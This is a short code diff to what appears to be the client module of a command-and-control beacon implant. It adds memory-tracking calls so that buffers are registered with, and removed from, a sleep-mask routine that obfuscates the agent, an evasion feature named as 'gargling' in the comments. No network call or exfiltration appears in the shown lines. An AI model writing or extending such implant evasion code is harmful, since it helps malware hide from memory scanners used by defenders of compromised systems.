@@ -12,6 +12,7 @@
  */
 
 #include "beacon.h"
+#include "track_memory.h"
 #include "channel.h"
 #include "commands.h"
 #include "security.h"
@@ -37,7 +38,9 @@ void client_init(LCHANNEL channel) {
 	char * optr = out;
 
 	/* alloc our data */
-	client_write_buffer = (char *)malloc(MAX_GET); /* TODO buffer cleaned up via client_stop(), clean up on exit */
+	client_write_buffer = (char *)malloc(MAX_GET); /* freed via client_stop() / track_memory_cleanup */
+	if (client_write_buffer != NULL)
+		track_memory_add(client_write_buffer, MAX_GET, TRACK_MEMORY_MALLOC, TRUE, NULL);
 	client_write_len = 0;
 
 	/* now we can assign the handle */
@@ -59,12 +62,17 @@ void client_stop() {
 	/* free up some of our data */
 	client_write_len = 0;
 
-	/* free our datarz */
-	if (client_write_buffer != NULL)
+	/* free our datarz - unregister from the tracker first so a later
+	 * sleep-mask walk cannot touch the freed ranges */
+	if (client_write_buffer != NULL) {
+		track_memory_remove(client_write_buffer);
 		free(client_write_buffer);
+	}
 
-	if (client_read_buffer != NULL)
+	if (client_read_buffer != NULL) {
+		track_memory_remove(client_read_buffer);
 		free(client_read_buffer);
+	}
 
 	client_write_buffer = NULL;
 	client_read_buffer  = NULL;
@@ -148,8 +156,11 @@ void client_flush() {
 void client_process() {
 	int length = 0;
 
-	if (client_read_buffer == NULL)
-		client_read_buffer = (char *)malloc(MAX_GET);  /* TODO buffer cleaned up via client_stop(), clean up on exit */
+	if (client_read_buffer == NULL) {
+		client_read_buffer = (char *)malloc(MAX_GET);
+		if (client_read_buffer != NULL)
+			track_memory_add(client_read_buffer, MAX_GET, TRACK_MEMORY_MALLOC, TRUE, NULL);
+	}
 
 	while (TRUE) {
 		/* wait for data to be available (and obfuscate our agent if gargling is enabled) */
